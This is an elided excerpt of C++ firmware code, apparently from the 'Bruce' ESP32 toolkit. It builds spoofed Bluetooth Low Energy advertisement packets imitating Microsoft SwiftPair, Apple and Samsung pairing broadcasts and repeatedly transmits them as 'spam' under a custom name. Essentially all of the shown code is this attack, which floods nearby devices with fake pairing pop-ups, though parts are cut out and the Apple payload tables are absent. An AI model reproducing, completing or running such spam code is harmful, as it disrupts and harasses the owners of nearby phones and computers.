...
BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, const std::string &customName = "Bruce")
{
  ...
  case Microsoft:
  {
    char nameBuffer[50]; // Buffer for the name

    // Seed the random number generator if not done elsewhere
    srand(time(0));

    // Generate a random number between 1 and 100
    int randomNumber = (rand() % 100) + 1;

    snprintf(nameBuffer, sizeof(nameBuffer), "%s [%d]", customName.c_str(), randomNumber);

    uint8_t name_len = strlen(nameBuffer);
    ...
    AdvData_Raw[i++] = 0x00;
    AdvData_Raw[i++] = 0x80;
    memcpy(&AdvData_Raw[i], nameBuffer, name_len);
    i += name_len;
  ...
  case Apple:
  {
    int rand = random(2);
    if (rand == 0)
      AdvData.addData(std::string((char *)IOS1[random(sizeof(IOS1) / sizeof(IOS1[0]))], 31));
    else
      AdvData.addData(std::string((char *)IOS2[random(sizeof(IOS2) / sizeof(IOS2[0]))], 23));
    break;
  }
  case Samsung:
  {
...
//// https://github.com/Spooks4576
void executeSpam(EBLEPayloadType type, const String &customName = "")
{
  uint8_t macAddr[6];
  if (type != Apple)
  {
  ...
  // Pass the custom name to GetUniversalAdvertisementData
  BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type, customName.c_str());
    ...
    if (millis() - timer > 20)
    {
      ...
      case 1: // SwiftPair
        if (customName.isEmpty())
          customName = keyboard("Bruce", 30, "Custom name to spam:");
        displayRedStripe("SwiftPair (" + String(count) + ")", TFT_WHITE, bruceConfig.priColor);
        executeSpam(Microsoft, customName);
        break;
      case 2: // Samsung
